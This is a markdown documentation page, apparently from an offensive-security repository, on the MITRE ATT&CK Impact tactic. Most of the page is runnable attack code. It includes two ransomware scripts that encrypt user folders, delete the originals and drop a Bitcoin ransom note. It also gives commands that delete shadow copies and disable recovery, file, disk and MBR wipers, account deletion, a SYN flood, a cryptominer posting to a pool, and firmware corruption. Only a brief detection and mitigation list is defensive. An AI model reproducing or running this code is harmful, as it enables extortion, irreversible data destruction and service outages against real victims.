# Phase 10: Impact

## 🎯 Overview

Impact techniques are designed to disrupt availability or integrity of systems and data. Represents the final objectives of destructive attacks and ransomware operations.

### MITRE ATT&CK: Impact (TA0040)
**Coverage**: 13 techniques including data destruction, encryption, denial of service, and system manipulation.

---

## Key Techniques

### 1. Data Encrypted for Impact (T1486)

#### Ransomware Encryption
```python
from cryptography.fernet import Fernet
import os

def encrypt_files(directory, key):
    """Encrypt files in directory"""
    cipher = Fernet(key)
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.doc', '.docx', '.pdf', '.txt', '.xlsx')):
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    encrypted = cipher.encrypt(data)
                    
                    with open(file_path, 'wb') as f:
                        f.write(encrypted)
                    
                    # Rename with extension
                    os.rename(file_path, file_path + '.encrypted')
                except:
                    pass

# Generate key
key = Fernet.generate_key()
print(f"Encryption key: {key.decode()}")

# Encrypt
encrypt_files('C:\\Users\\', key)

# Drop ransom note
with open('C:\\Users\\README.txt', 'w') as f:
    f.write("Your files have been encrypted. Contact us for decryption key.")
```

### 2. Data Destruction (T1485)

```powershell
# Wipe files
Get-ChildItem C:\Users -Recurse -File | ForEach-Object {
    $random = [System.IO.File]::ReadAllBytes($_FullName)
    for($i=0; $i -lt $random.Length; $i++) { $random[$i] = Get-Random -Minimum 0 -Maximum 256 }
    [System.IO.File]::WriteAllBytes($_.FullName, $random)
    Remove-Item $_.FullName -Force
}

# Linux data destruction
find /home -type f -exec shred -vfz -n 10 {} \;
```

### 3. Defacement (T1491)

```bash
# Web defacement
echo "<h1>Hacked by APT Group</h1>" > /var/www/html/index.html

# Replace all HTML files
find /var/www -name "*.html" -exec cp defaced.html {} \;
```

### 4. Service Stop (T1489)

```powershell
# Stop critical services
Stop-Service -Name "MSSQLSERVER" -Force
Stop-Service -Name "SQLServerAgent" -Force
Stop-Service -Name "MSSQLServerOLAPService" -Force

# Disable services
Set-Service -Name "MSSQLSERVER" -StartupType Disabled

# Linux service disruption
systemctl stop mysql
systemctl stop apache2
systemctl disable mysql
```

### 5. Inhibit System Recovery (T1490)

```batch
# Delete shadow copies
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Disable Windows Recovery
bcdedit /set {default} recoveryenabled no
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Delete backup catalogs
wbadmin delete catalog -quiet
```

### 6. Disk Wipe (T1561)

```python
import os

def wipe_disk(drive):
    """Overwrite disk with random data"""
    block_size = 4096
    
    with open(drive, 'wb') as f:
        while True:
            try:
                f.write(os.urandom(block_size))
            except:
                break

# Wipe entire disk (DANGEROUS)
wipe_disk('\\\\.\\PhysicalDrive0')
```

### 7. Account Access Removal (T1531)

```powershell
# Delete user accounts
Get-LocalUser | Where-Object {$_.Name -ne "Administrator"} | Remove-LocalUser -Force

# Reset admin password
net user Administrator NewRandomPassword123!

# Disable accounts
Get-ADUser -Filter * | Disable-ADAccount
```

### 8. Resource Hijacking (T1496)

```python
# Cryptocurrency mining
import hashlib
import requests

def mine_cryptocurrency():
    """CPU-intensive mining operation"""
    nonce = 0
    while True:
        data = f"mining_data_{nonce}".encode()
        hash_result = hashlib.sha256(data).hexdigest()
        
        if hash_result.startswith('0000'):
            # Submit to mining pool
            requests.post('http://mining-pool.com/submit', data={'hash': hash_result})
        
        nonce += 1

# Start mining
mine_cryptocurrency()
```

### 9. Network Denial of Service (T1498)

```python
from scapy.all import *

def syn_flood(target_ip, target_port):
    """SYN flood attack"""
    while True:
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        send(ip/tcp, verbose=0)

# Launch attack
syn_flood("192.168.1.100", 80)
```

### 10. Firmware Corruption (T1495)

```bash
# Corrupt BIOS/UEFI (requires privileges)
dd if=/dev/urandom of=/dev/mem bs=1M count=1

# Flash malicious firmware
flashrom -w malicious_firmware.bin
```

---

## Real-World Impact Scenarios

### NotPetya Wiper Attack
```python
# NotPetya MBR overwrite
import os

def overwrite_mbr():
    """Overwrite Master Boot Record"""
    malicious_mbr = b'\x33\xc0\x8e\xd0\xbc...'  # MBR code
    
    with open('\\\\.\\PhysicalDrive0', 'r+b') as drive:
        drive.seek(0)
        drive.write(malicious_mbr)
        drive.flush()

overwrite_mbr()
os.system('shutdown /r /t 0')
```

### WannaCry Ransomware
```python
# Simplified WannaCry encryption logic
def wannacry_encrypt():
    # Generate RSA key pair
    from Crypto.PublicKey import RSA
    key = RSA.generate(2048)
    
    # For each file, generate AES key
    from Crypto.Cipher import AES
    for file in target_files:
        aes_key = os.urandom(32)
        cipher = AES.new(aes_key, AES.MODE_CBC)
        
        # Encrypt file with AES
        encrypt_file(file, cipher)
        
        # Encrypt AES key with RSA
        encrypted_key = key.publickey().encrypt(aes_key, 32)
        save_encrypted_key(encrypted_key)
```

### Shamoon Disk Wiper
```c
// Shamoon disk wiping
HANDLE hDevice = CreateFile("\\\\.\\PhysicalDrive0",
                           GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);

BYTE wipeData[512];
memset(wipeData, 0, sizeof(wipeData));

DWORD bytesWritten;
for(DWORD sector = 0; sector < total_sectors; sector++) {
    WriteFile(hDevice, wipeData, sizeof(wipeData), &bytesWritten, NULL);
}

CloseHandle(hDevice);
```

---

## Ransomware Implementation

### Complete Ransomware Framework
```python
import os
import socket
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class Ransomware:
    def __init__(self):
        self.rsa_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.rsa_key.public_key()
        
        self.extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.txt', '.jpg', '.png', '.zip', '.sql', '.db'
        ]
    
    def encrypt_file(self, file_path):
        """Encrypt single file"""
        try:
            # Generate random AES key
            aes_key = os.urandom(32)
            iv = os.urandom(16)
            
            # Read file
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            # Encrypt with AES
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CFB(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            
            # Encrypt AES key with RSA
            encrypted_key = self.public_key.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Write encrypted file
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(iv)
                f.write(encrypted_key)
                f.write(ciphertext)
            
            # Delete original
            os.remove(file_path)
            
        except Exception as e:
            pass
    
    def encrypt_directory(self, directory):
        """Recursively encrypt directory"""
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensions):
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path)
    
    def drop_ransom_note(self, directory):
        """Create ransom note"""
        note = """
═══════════════════════════════════════════════════════════
        YOUR FILES HAVE BEEN ENCRYPTED
═══════════════════════════════════════════════════════════

All your important files have been encrypted with military-grade
encryption. The only way to recover your files is to purchase
the decryption key from us.

WHAT HAPPENED?
Your files are encrypted with RSA-2048 and AES-256 algorithms.
Without our decryption key, recovery is impossible.

HOW TO RECOVER?
1. Send $500 in Bitcoin to: [BITCOIN_ADDRESS]
2. Email your computer ID to: recovery@[].onion
3. You will receive decryption key within 24 hours

YOUR COMPUTER ID: {}

WARNING:
- Do not rename encrypted files
- Do not try to decrypt yourself
- Do not contact police or FBI
- You have 72 hours before price doubles

═══════════════════════════════════════════════════════════
""".format(socket.gethostname())
        
        note_path = os.path.join(directory, 'README_DECRYPT.txt')
        with open(note_path, 'w') as f:
            f.write(note)
        
        # Set as wallpaper
        os.system(f'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d {note_path} /f')
        os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
    
    def execute(self):
        """Main ransomware execution"""
        # Target directories
        targets = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Downloads'),
            'C:\\Users\\Public'
        ]
        
        for target in targets:
            if os.path.exists(target):
                self.encrypt_directory(target)
                self.drop_ransom_note(target)
        
        # Exfiltrate decryption key to C2
        # self.send_key_to_c2()

# Execute
# ransom = Ransomware()
# ransom.execute()
```

---

## Detection & Mitigation

**Detection**:
- Monitor for mass file modifications
- Detect shadow copy deletion
- Alert on unusual encryption activity
- Track service stops

**Mitigation**:
- Regular offline backups
- Endpoint protection with anti-ransomware
- Restrict write access
- Network segmentation
- Email filtering

---

## Summary

Impact techniques represent the final adversary objectives:

- **Data Encryption** - Ransomware operations
- **Data Destruction** - Wiper attacks
- **Service Disruption** - Availability attacks
- **System Manipulation** - Recovery inhibition
- **Resource Hijacking** - Cryptomining

**Critical Defense**: Robust backup strategy and incident response planning.

---

**Previous**: [← Phase 9: Command & Control](../09-command-control/README.md)
**Return to**: [Main Documentation](../../README.md)

---

**Last Updated**: January 2025
**Author**: Advanced Threat Research Team